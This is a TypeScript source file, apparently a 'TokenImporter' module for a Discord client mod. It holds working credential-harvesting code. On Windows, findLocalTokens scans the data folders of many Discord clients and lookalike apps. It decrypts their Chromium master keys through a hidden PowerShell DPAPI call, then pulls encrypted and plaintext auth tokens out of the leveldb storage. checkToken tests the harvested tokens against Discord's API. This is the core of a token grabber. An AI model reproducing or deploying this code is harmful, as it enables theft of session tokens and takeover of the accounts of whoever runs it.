/*
 * Midnightcord, a Discord client mod
 * Copyright (c) 2026 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { execFileSync } from "child_process";
import * as crypto from "crypto";
import { net, safeStorage } from "electron";
import { existsSync, readdirSync, readFileSync } from "fs";
import { join } from "path";

// Verification token via Electron net.request (utilise le moteur réseau Chromium d'Electron avec le bon fingerprint TLS)
export async function checkToken(_: any, token: string): Promise<{ valid: boolean; user?: any; error?: string; }> {
    return new Promise(resolve => {
        try {
            const req = net.request({
                method: "GET",
                url: "https://discord.com/api/v9/users/@me"
            });

            req.setHeader("Authorization", token);
            req.setHeader("Content-Type", "application/json");

            req.on("response", res => {
                let data = "";
                res.on("data", (chunk: Buffer) => { data += chunk.toString(); });
                res.on("end", () => {
                    if (res.statusCode === 200) {
                        try { resolve({ valid: true, user: JSON.parse(data) }); }
                        catch { resolve({ valid: false, error: "parse_error" }); }
                    } else if (res.statusCode === 401 || res.statusCode === 403) {
                        resolve({ valid: false, error: "unauthorized" });
                    } else if (res.statusCode === 429) {
                        resolve({ valid: false, error: "rate_limited" });
                    } else {
                        resolve({ valid: false, error: `http_${res.statusCode}` });
                    }
                });
            });

            req.on("error", (e: any) => {
                console.error("[TokenImporter] net req error:", e?.message);
                resolve({ valid: false, error: "network_error" });
            });

            req.end();
        } catch (err: any) {
            console.error("[TokenImporter] net exception:", err);
            resolve({ valid: false, error: "exception" });
        }
    });
}

// Encryption du token (appele depuis le renderer)
export async function encryptToken(_: any, token: string): Promise<string | null> {
    try {
        if (!safeStorage.isEncryptionAvailable()) return null;
        const encrypted = safeStorage.encryptString(token);
        return "dQw4w9WgXcQ:" + encrypted.toString("base64");
    } catch {
        return null;
    }
}

export async function decryptTokenNative(_: any, encryptedBase64: string): Promise<string | null> {
    try {
        if (!safeStorage.isEncryptionAvailable()) return null;
        if (!encryptedBase64.startsWith("dQw4w9WgXcQ:")) return null;
        const raw = Buffer.from(encryptedBase64.split("dQw4w9WgXcQ:")[1], "base64");
        return safeStorage.decryptString(raw);
    } catch {
        return null;
    }
}

function decryptDPAPI(encryptedKeyBase64: string): Buffer {
    const buf = Buffer.from(encryptedKeyBase64, "base64").slice(5);
    const hexStr = buf.toString("hex");
    const script = `
        Add-Type -AssemblyName System.Security
        $bytes = [object[]]::new(${buf.length})
        $hex = "${hexStr}"
        for ($i = 0; $i -lt $hex.Length; $i += 2) {
            $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
        }
        $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        [BitConverter]::ToString($unprotected) -replace '-'
    `;
    try {
        const res = execFileSync("powershell", ["-NoProfile", "-Command", script], {
            encoding: "utf8",
            windowsHide: true // Fix brief terminal window appearance
        });
        return Buffer.from(res.trim(), "hex");
    } catch (e: any) {
        throw e;
    }
}

function decryptToken(encryptedBase64: string, masterKey: Buffer): string {
    const buf = Buffer.from(encryptedBase64, "base64");
    const iv = buf.subarray(3, 15);
    const payload = buf.subarray(15);
    const authTag = payload.subarray(payload.length - 16);
    const ciphertext = payload.subarray(0, payload.length - 16);

    const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(ciphertext, undefined, "utf8");
    decrypted += decipher.final("utf8");
    return decrypted;
}

export async function findLocalTokens(): Promise<string[]> {
    const tokens = new Set<string>();

    if (process.platform !== "win32") return [];

    const roaming = process.env.APPDATA || "";
    const local = process.env.LOCALAPPDATA || "";

    // All known Discord-based client variants, scanned in both APPDATA (Roaming) and LOCALAPPDATA
    const appNames = [
        "discord",
        "discordcanary",
        "discordptb",
        "discorddevelopment",
        "lightcord",
        "vesktop",
        "equicord",
        "betterdiscord",
        "xascord",
        "arrpc",
    ];

    // Build candidate base paths: Roaming\<app> and Local\<app>
    const candidatePaths: string[] = [];
    for (const app of appNames) {
        candidatePaths.push(join(roaming, app));
        candidatePaths.push(join(local, app));
    }

    // Also scan Roaming\Vencord and Local\Vencord (Vencord injected clients share Discord's data)
    // These are the same paths as above, but kept explicit for clarity.
    // Additionally discover any folder whose name contains "discord" or "cord" in %LOCALAPPDATA%
    try {
        for (const entry of readdirSync(local)) {
            if (/discord|cord|vencord|equicord/i.test(entry)) {
                const p = join(local, entry);
                if (!candidatePaths.includes(p)) candidatePaths.push(p);
            }
        }
    } catch { }

    // Regex that captures only valid base64 characters (no quote/backslash contamination)
    const ENC_RE = /dQw4w9WgXcQ:([A-Za-z0-9+/]+=*)/g;
    // Plain-text token pattern (legacy / non-encrypted storage)
    const PLAIN_RE = /(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})/g;
    // Validation of decrypted token
    const TOKEN_VALID = /^(?:mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{4,7}\.[\w-]{27,40})$/;

    for (const appPath of candidatePaths) {
        try {
            const localStatePath = join(appPath, "Local State");
            if (!existsSync(localStatePath)) continue;

            const localState = JSON.parse(readFileSync(localStatePath, "utf8"));
            const encryptedKey = localState.os_crypt?.encrypted_key;
            if (!encryptedKey) continue;

            let masterKey: Buffer;
            try {
                masterKey = decryptDPAPI(encryptedKey);
            } catch {
                continue; // Can't decrypt master key — skip this app
            }

            // Directories that can hold token data for this app
            const scanDirs = [
                join(appPath, "Local Storage", "leveldb"),
                join(appPath, "Session Storage"),
                join(appPath, "Default", "Local Storage", "leveldb"), // Chromium profile layout
                join(appPath, "Default", "Session Storage"),
            ];

            for (const dir of scanDirs) {
                if (!existsSync(dir)) continue;

                let files: string[];
                try { files = readdirSync(dir); } catch { continue; }

                for (const file of files) {
                    // Only scan data files; skip LOCK, MANIFEST, CURRENT, LOG
                    if (!/\.(ldb|log)$/i.test(file)) continue;

                    let content: string;
                    try {
                        content = readFileSync(join(dir, file), "latin1");
                    } catch { continue; }

                    // ── Encrypted tokens (v10 / dQw4 format) ──────────────────
                    let m: RegExpExecArray | null;
                    ENC_RE.lastIndex = 0;
                    while ((m = ENC_RE.exec(content)) !== null) {
                        try {
                            const enc = m[1];
                            // Sanity: base64-decoded length must be > 16+12 bytes (AES-GCM overhead)
                            const rawLen = Math.floor(enc.length * 3 / 4);
                            if (rawLen < 30) continue;
                            const token = decryptToken(enc, masterKey);
                            if (token && TOKEN_VALID.test(token)) tokens.add(token);
                        } catch { }
                    }

                    // ── Plain-text tokens (legacy storage or non-encrypted) ────
                    PLAIN_RE.lastIndex = 0;
                    while ((m = PLAIN_RE.exec(content)) !== null) {
                        const t = m[0];
                        if (TOKEN_VALID.test(t)) tokens.add(t);
                    }
                }
            }
        } catch { }
    }

    return Array.from(tokens);
}

